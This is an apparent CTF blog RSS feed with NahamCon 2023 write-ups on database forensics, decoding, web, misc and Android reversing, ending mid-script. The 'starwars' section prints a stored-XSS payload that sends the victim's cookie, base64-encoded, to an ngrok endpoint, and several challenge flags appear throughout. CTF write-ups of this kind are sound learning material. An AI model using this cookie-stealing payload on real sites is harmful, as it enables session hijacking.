<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>ctf writeups on f0rk3b0mb</title>
        <link>https://f0rk3b0mb.github.io/categories/writeups/</link>
        <description>Recent content in ctf writeups on f0rk3b0mb</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 15 Jun 2023 20:58:33 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/categories/writeups/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Nahamcon2023</title>
        <link>https://f0rk3b0mb.github.io/p/nahamcon2023/</link>
        <pubDate>Thu, 15 Jun 2023 20:58:33 +0300</pubDate>
        
        <guid>https://f0rk3b0mb.github.io/p/nahamcon2023/</guid>
        <description>&lt;h4 id=&#34;nahamcon-ctf-2023-writeups&#34;&gt;Nahamcon CTF 2023 writeups&lt;/h4&gt;
&lt;h3 id=&#34;warmups&#34;&gt;warmups&lt;/h3&gt;
&lt;hr&gt;
&lt;h3 id=&#34;blobber&#34;&gt;blobber&lt;/h3&gt;
&lt;p&gt;Thic challenge had a downloadable part , the file was a sqlite database.&lt;/p&gt;
&lt;p&gt;I opened the file using sqlite database browser&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/sqlite.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;sqlite&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as  entries. Read more &lt;a class=&#34;link&#34; href=&#34;https://rogerbinns.github.io/apsw/blob.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;we can use this sql statement to get the blob&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; data from blobber where &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;238&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Then save it to a file ,  the resulting file in is a bzip2 archive, extracting , you get an image of the flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/blobber_extract.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;flag&#34;
	
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;ninety-one&#34;&gt;ninety one&lt;/h3&gt;
&lt;p&gt;In this challenge you are provided with an encoded string&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;@iH&amp;lt;,&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;jbRH?L^VjGJH&amp;lt;vn3p7I,x~@1jyt&amp;gt;x?,!YAJr*08P
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;I used this tool &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://www.dcode.fr/base-91-encoding&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt; to analyse and decode it , it was encrypted using base91 encoding&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;dfb88c7d9ca38e71dc27e1072fc43d1b&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;glasses&#34;&gt;glasses&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;This challenge you were provided with a webpage. It had no functionality, based on the title of the challenge it is obvious that we nee to find something hidden.&lt;/p&gt;
&lt;p&gt;Lokking through the source I found  obfuscated js code. You can use this tool &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://lelinhtinh.github.io/de4js/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt; to deobfuscate it . It returns  html code the with the flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;8084e4530cf649814456f2a291eb81e9&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;web-category&#34;&gt;web category&lt;/h3&gt;
&lt;hr&gt;
&lt;h3 id=&#34;starwars&#34;&gt;starwars&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;In this challenge you are provided with a web endpoint that allows you to signup and login The goal is to login as admin , you can also comment and the admin reviews your comment , obvoiusly it is classic xxs&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/alert.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;xss&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;this below is the payload i used . it fetches my ngrok endpoint with the cookie appanded at the end. I dont know if the first part was necessary , I   generated it by trial and error and it worked&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;var iframe = document.body.appendChild(document.createElement(&amp;#39;iframe&amp;#39;));
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;iframe.style.cssText = &amp;#39;height: 500px; width: 100%&amp;#39;;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;iframe.src = &amp;#39;http://challenge.nahamcon.com:30467/signup&amp;#39;;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;iframe.onload = function() { fetch(&amp;#39;http://f910-102-167-145-177.ngrok-free.app?iframeContents=&amp;#39; + btoa(window.document.cookie), { method: &amp;#39;GET&amp;#39; }).then(response =&amp;gt; response.json()).then(data =&amp;gt; console.log(data)).catch(error =&amp;gt; console.error(error)); };&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;the flag will be returned in base64 format. Use it in the browser to access /admin page and the flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/base64.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;base64&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/sflag.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;flag&#34;
	
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;misc-category&#34;&gt;misc category&lt;/h3&gt;
&lt;hr&gt;
&lt;h3 id=&#34;zombies&#34;&gt;zombies&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;In this challenge you were provided with an ssh endpoint to connect to&lt;/p&gt;
&lt;p&gt;reading the file .user-entrypoint.sh&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/nohup.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;file&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;nohup is  enables a program to run even after a terminal window is closed , if you check running processes you can see that tail is still running.
Running processes usually have the activities stored in /proc directory. in the image below 11 is the pid of the tail process&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/tail.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;flag&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;mobile-category&#34;&gt;mobile category&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;This challenge requires a set of  tools to be able to do anything :&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/pxb1988/dex2jar&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;dex2jar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://java-decompiler.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;jdgui&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://ghidra-sre.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ghidra&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.genymotion.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;genymotion&lt;/a&gt;  &amp;laquo;  android emulator on pc&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.android.com/tools/adb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;adb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://ibotpeaches.github.io/Apktool/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;apktools&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;jninjaspeak&#34;&gt;jninjaspeak&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;In this challnge you are provided with an apk file , you can install it on genymotion using adb, it is a simple prompt that  converts input to jninjaspeak.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb install jninjaspeak.apk

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Decompile the application using apktool&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
use :   apktool -r -s d   jninjaspeak.apk


&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We use -r -s flags to tell apktool not to decompile the dexfiles to smali which it does by default.&lt;/p&gt;
&lt;p&gt;Convert the dex files to jar using dex2jar to be able to view the source using jdgui.&lt;/p&gt;
&lt;p&gt;In the mainactivity we see that the program needs libjninjaspeak.so  liblary that is used to translate the input.&lt;/p&gt;
&lt;p&gt;Here we use ghidra to reverse engineer the liblary , the liblary is in the /lib in the folder apktool generated.&lt;/p&gt;
&lt;p&gt;In ghidra , in the main function of the liblary we find the flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/jninja.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;flag&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;flag{1f539e4a706e6181dae9db3fad6a78f1}&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;fortune-teller&#34;&gt;Fortune teller&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;For this challenge follow the above steps  to install and decompile the application and convers dex files to jar.&lt;/p&gt;
&lt;p&gt;The mainactivity function in located the classes3.dex. Looking closely you can see that the application uses our input as a key to decrypt an encrypted file , the encryption used is AES.&lt;/p&gt;
&lt;p&gt;The file is decrypted in the decrypt.class. Where our input is used in the SecretKeySpec
object.&lt;/p&gt;
&lt;p&gt;Based on my simple java programming undertanding :)  there is a variable called correctString that is initialized in the main function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/correct.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;correct&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;It is followed by its getter function&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/getter.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;getter&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;and then tracing it we find the  setter function&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/setter.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;setter&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;It sets correctString to the value by resource id 2131755048 . Resource ids can be traced what that point to in the classes2.dex, path is shown below&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/ridpath.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ridpath&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/rid.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;rid&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;It is point to a string , the resorces can be found the /res folder since the value is a string we goto /res/values  and cat strings.xml.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/strings.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;strings&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;The key is &amp;ldquo;you won this ctf&amp;rdquo; , enter it and get the flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/teller_flag.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;flag&#34;
	
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;wheres-waldo&#34;&gt;wheres waldo&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;In this challenge you are provided with an apk file , follow the steps above to decompile it and open the sources in jd gui and install it in the emulator.&lt;/p&gt;
&lt;p&gt;This application is some type of maps applcation so the objective is to find the location of waldo in the map.&lt;/p&gt;
&lt;p&gt;Analysing the mainactivity function you can see thet the application is making a request to an endpoint which determines id we have found waldo and the distance from him&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/waldo.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;waldo&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;The objective is to set longitude and latitude that results on the off_by value to result to zero as you can see below&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;
&lt;span class=&#34;n&#34;&gt;mapView1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getController&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setCenter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IGeoPoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GeoPoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLatitude&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLongitude&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()));&lt;/span&gt;
          &lt;span class=&#34;n&#34;&gt;Request&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://challenge.nahamcon.com:30001/location?lat=&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLatitude&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;amp;long=&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLongitude&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
          &lt;span class=&#34;n&#34;&gt;Response&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OkHttpClient&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newCall&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;the code above takes the off_by and calculates the distance from waldo by miles.&lt;/p&gt;
&lt;p&gt;I scripted this  python program to do all the hardwork (at least).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculate_distance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;latitude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;longitude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://challenge.nahamcon.com:30001/location?lat=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;latitude&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;amp;long=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;longitude&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Replace with the actual API endpoint&lt;/span&gt;
